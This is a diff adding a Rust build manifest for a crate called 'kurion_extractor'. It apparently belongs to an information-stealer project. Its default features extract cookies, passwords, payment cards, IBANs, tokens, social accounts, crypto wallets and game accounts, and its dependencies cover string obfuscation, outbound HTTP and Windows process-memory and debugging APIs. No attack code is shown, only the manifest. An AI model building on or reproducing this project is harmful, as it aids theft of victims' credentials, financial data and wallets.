@@ -1,0 +1,40 @@
+[package]
+name = "kurion_extractor"
+version = "0.1.0"
+edition = "2021"
+
+[features]
+default = ["extract_cookies", "extract_passwords", "extract_cards", "extract_ibans", "extract_tokens", "extract_bookmarks", "extract_socials", "extract_wallets", "extract_games"]
+extract_cookies = []
+extract_passwords = []
+extract_cards = []
+extract_ibans = []
+extract_tokens = []
+extract_bookmarks = []
+extract_socials = []
+extract_wallets = []
+extract_games = []
+
+[dependencies]
+rusqlite = { version = "0.32", features = ["bundled"], default-features = false }
+serde = { version = "1.0", features = ["derive"], default-features = false }
+serde_json = { version = "1.0", default-features = false, features = ["std"] }
+kurion_crypto = { path = "../crypto" }
+kurion_core = { path = "../core" }
+kurion_sys = { path = "../sys" }
+regex-lite = "0.1"  # Smaller regex alternative (~100KB vs ~400KB)
+base64 = { version = "0.22", default-features = false, features = ["std"] }
+obfstr = "0.4"
+rayon = "1.10"
+ureq = { version = "2.10", default-features = false, features = ["tls", "json"] }
+
+[target.'cfg(windows)'.dependencies]
+winreg = "0.52"
+windows = { version = "0.58", features = [
+    "Win32_Foundation",
+    "Win32_System_Diagnostics_ToolHelp",
+    "Win32_System_Diagnostics_Debug",
+    "Win32_System_Threading",
+    "Win32_System_Memory",
+    "Win32_Security",
+] }
